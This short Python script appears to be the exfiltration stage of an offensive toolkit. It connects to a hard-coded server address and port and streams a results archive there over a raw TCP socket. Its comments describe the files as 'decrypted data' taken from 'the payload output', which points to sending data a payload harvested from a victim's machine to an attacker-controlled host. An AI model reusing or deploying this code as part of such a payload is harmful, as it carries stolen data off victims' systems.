import os
import socket
import struct
import time
# IMPORTANT: Change the address and port according to your server
SERVER_IP = '192.168.1.101'
PORT = 5001
# decrypted data to be sent
# change accroding to the payload output
FILES_TO_SEND = [
r".\results\results.zip",
]
def send_file(file_path):
	filename = os.path.basename(file_path).encode()
	file_size = os.path.getsize(file_path)
	with socket.socket() as s:
		s.connect((SERVER_IP, PORT))
		# Send filename length (4 bytes)
		s.sendall(struct.pack('>I', len(filename)))
		# Send filename
		s.sendall(filename)
		# Send file size (8 bytes)
		s.sendall(struct.pack('>Q', file_size))
		# Send file content
		with open(file_path, "rb") as f:
			while chunk := f.read(4096):
				s.sendall(chunk)
if __name__ == "__main__":
	for file in FILES_TO_SEND:
		send_file(file)

